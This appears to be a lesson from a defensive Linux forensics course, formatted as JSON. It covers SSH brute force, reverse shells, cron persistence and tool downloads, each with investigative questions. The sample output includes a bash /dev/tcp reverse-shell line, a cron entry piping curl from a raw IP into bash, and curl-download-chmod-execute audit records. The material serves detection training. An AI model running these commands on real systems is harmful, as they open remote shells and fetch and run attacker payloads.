      {
        "heading": "Reading Linux Attack Artifacts — What to Ask",
        "content": "Now combine everything into investigation. Linux intrusions follow recognizable patterns, and each leaves artifacts in the files and logs you now know. For each pattern, learn the indicator and the question.\n\n### SSH Brute Force (T1110.001)\n\nInternet-facing SSH is relentlessly attacked. The artifact in **auth.log/secure** is a flood of 'Failed password' lines from one or a few source IPs against many usernames, often including root and common names like admin, oracle, ubuntu. **The sting:** watch for an 'Accepted password' (or 'Accepted publickey') from that same source right after the flood — that is a successful compromise. **The questions:** How many failures preceded any success, and from where? Is the source external? Did a login succeed, and if so, what did that session do next (check subsequent commands via auditd and history)?\n\n### Reverse Shells (T1059.004)\n\nAfter exploiting a service, attackers call back out to get an interactive shell. The artifact is a shell process whose parent is a web/service process, and a command line containing **/dev/tcp/**, **bash -i**, **nc -e**, or a python/perl one-liner opening a socket. **The questions:** What is the PPID — did nginx/apache/java spawn a shell? What outbound IP and port is it talking to, and is that destination known-bad? Does the outbound connection correlate with a preceding web exploit in the access log?\n\n### Suspicious cron / persistence (T1053.003)\n\nA crontab or /etc/cron.d entry that runs a script from **/tmp**, references a raw IP, or uses a **download-and-execute** pattern (curl|bash) is persistence. **The questions:** When was the cron file last modified, and does that align with the incident? Does any admin recognize the job? Does it re-fetch a payload on an interval (which also explains beaconing you might see at the network layer)?\n\n### Malicious Downloads (T1105 — Ingress Tool Transfer)\n\nOnce inside, attackers pull tooling. The artifact is **wget** or **curl** (also python's urllib, or /dev/tcp) reaching an external IP, frequently writing to /tmp, often followed immediately by a **chmod +x** and execution. Auditd execve records capture the full command even when bash history is cleared. **The questions:** What URL/IP was contacted, and what is its reputation? Where was the file written, and was it made executable and run? What process launched the download — a human shell, or a web service (which would mean RCE)?\n\n### The Meta-Questions\n\nAcross all Linux investigations, a few questions cut through the noise. *What is the parent process?* — parentage exposes web-exploit-to-shell chains that a flat process list hides. *Does anything run out of /tmp or /dev/shm?* — legitimate software rarely does. *Was anything made setuid, or did any uid-0 account appear?* — that is escalation. *What changed recently on disk?* — new or modified cron jobs, systemd units, authorized_keys, and rc files are where persistence hides. And always: *does the auid tie the action back to a real human, or did a service account do something a service account never should?* Linux gives you the whole story if you know which log holds which chapter — auth.log for the door, auditd for the hands, the filesystem for the footprints. Read them together and a Linux compromise is no harder to unravel than a Windows one.",
        "codeExample": "# 1) SSH brute force then success (auth.log) — T1110.001\n$ grep 'sshd' /var/log/auth.log | grep -E 'Failed|Accepted'\nJul 4 02:11:03 web01 sshd: Failed password for root from 203.0.113.9 ...   # x120 in 90s\nJul 4 02:12:41 web01 sshd: Accepted password for root from 203.0.113.9 ... # <-- COMPROMISE\n\n# 2) Reverse shell in process tree — T1059.004\n$ ps -ef --forest | grep -E 'nginx|apache|java|bash'\nwww 1450 1122 \\_ bash -i >& /dev/tcp/45.9.148.7/4444 0>&1   # web svc -> outbound shell\n\n# 3) Suspicious cron persistence — T1053.003\n$ ls -lt /etc/cron.d/ ; cat /etc/cron.d/update\n*/5 * * * * root curl -s http://45.9.148.7/b.sh | bash      # download-and-run every 5 min\n\n# 4) Malicious download via auditd execve — T1105\ntype=EXECVE msg=audit(...): argc=4 a0=\"curl\" a1=\"-o\" a2=\"/tmp/m\" a3=\"http://45.9.148.7/m\"\ntype=EXECVE msg=audit(...): argc=3 a0=\"chmod\" a1=\"+x\" a2=\"/tmp/m\"   # made executable\ntype=EXECVE msg=audit(...): argc=1 a0=\"/tmp/m\"                       # then run from /tmp"
      }
